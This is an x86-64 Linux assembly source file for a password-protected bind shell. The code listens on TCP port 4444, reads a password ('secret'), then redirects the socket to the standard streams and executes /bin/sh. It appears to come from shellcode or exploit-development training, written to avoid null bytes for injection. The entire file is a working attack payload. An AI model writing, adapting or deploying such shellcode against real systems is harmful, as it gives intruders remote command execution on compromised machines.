global _start

section .text

_start:
    ; RAX - syscall number
    ; RDI - 1st arg
    ; RSI - 2nd arg
    ; RDX - 3rd arg
    ; R10
    ; R8
    ; R9

    xor rax,rax
    xor rdi,rdi
    xor rsi,rsi
    xor rdx,rdx
    xor r10, r10
    xor r8,r8
    xor r9,r9


    ;  // sycall socketcall (sys_socket 1)
    ; sockfd = socket(AF_INET, SOCK_STREAM, 0);
    ; socket.AF_INET == 2
    ; socket.SOCK_STREAM == 1
    mov al, 41
    mov dil, 2
    mov sil, 1
    syscall

    mov rdi, rax ; store returned sockfd value to rdi


    ; // set struct values
    ; my_addr.sin_family = AF_INET; // 2
    ; my_addr.sin_port = htons(port); // port number
    ; my_addr.sin_addr.s_addr = INADDR_ANY; // 0 fill with the local IP
    xor rax, rax
    push rax
    mov dword [rsp-4], eax; INADDR_ANY == 0
    mov word [rsp-6], 0x5c11; hex(socket.htons(4444))
    ; below is done this way because mov word [rsp-8], 2 had a null byte in it
    ; mov word [rsp-8], 2
    xor r9, r9
    mov byte [rsp-7], r9b
    mov byte [rsp-8], 2; AF_INET == 2
    sub rsp, 8
    ; mov r15, rsp; store address pointing to sockaddr struct, as we'll need it later

    ; syscall 49
    ; bind(sockfd, (struct sockaddr *) &my_addr, sizeof(my_addr));
    xor rax, rax
    mov al, 49
    mov rsi, rsp
    xor rdx, rdx
    mov dl, 16
    syscall

    ; syscall 50
    ; listen(sockfd, 2);
    xor rax, rax
    mov al, 50
    xor rsi, rsi
    mov sil, 2
    syscall

    ; syscall 43
    ; resultfd = accept(sockfd, NULL, NULL);

    xor rax, rax
    mov al, 43
    sub rsp, 16 ; free up 16 bytes on stack to represent NULL sockaddr objects 
    mov rsi, rsp
    mov byte [rsp-1], 16
    sub rsp, 1
    mov rdx, rsp
    syscall

    mov r14, rax  ; store resultfd in r14

    ; close parent socket
    xor rax, rax
    mov al, 3
    syscall



recv_string:

    ; syscall 45
    ; ssize_t recvfrom(int sockfd, void *buf, size_t len, int flags,
    ;                  struct sockaddr *src_addr, socklen_t *addrlen);
    xor rax, rax
    mov al, 45

    mov rdi, r14
    ; Make space in stack for buffer
    sub rsp, 16
    mov rsi, rsp
    ; Length of buffer
    mov rdx, 16

    ; flags == 0
    xor r10, r10

    ; Push 16 null bytes onto stack for null sockaddr
    xor r8, r8
    push r8
    push r8
    mov r8, rsp
    
    xor r9,r9
    mov r9b, 16
    
    syscall


compare_string:

    xor rdx, rdx
    xor r10, r10
    xor r8, r8
    xor r9,r9

    mov r9, 0x0a746572636573 ; secret
    xor [rsi], r9
    
    jz shell

end:

    ; close baby socket
    xor rax, rax
    mov al, 3
    mov rdi, r14
    syscall

    ; exit
    xor rax, rax
    mov al, 60
    syscall

shell:
    ; strncmp(client_password, key, sizeof(key)) == 0

    ; // syscall 33
    ; dup2(resultfd, 2);
    ; dup2(resultfd, 1);
    ; dup2(resultfd, 0);
    xor rax, rax
    mov al, 33
    mov rdi, r14
    xor rsi, rsi
    syscall
    xor rax, rax
    mov al, 33
    inc rsi
    syscall
    xor rax, rax
    mov al, 33
    inc rsi
    syscall

    ; // syscall 59
    ; execve("/bin/sh", NULL, NULL);
    xor rax, rax
    mov al, 59
    xor rbx,rbx
    push rbx
    mov  rcx, 0x68732f2f6e69622f ; "/bin//sh"[::-1].encode('hex')
    push rcx
    mov rdi, rsp

    push rbx
    mov rdx, rsp

    push rdi
    mov rsi, rsp
    syscall

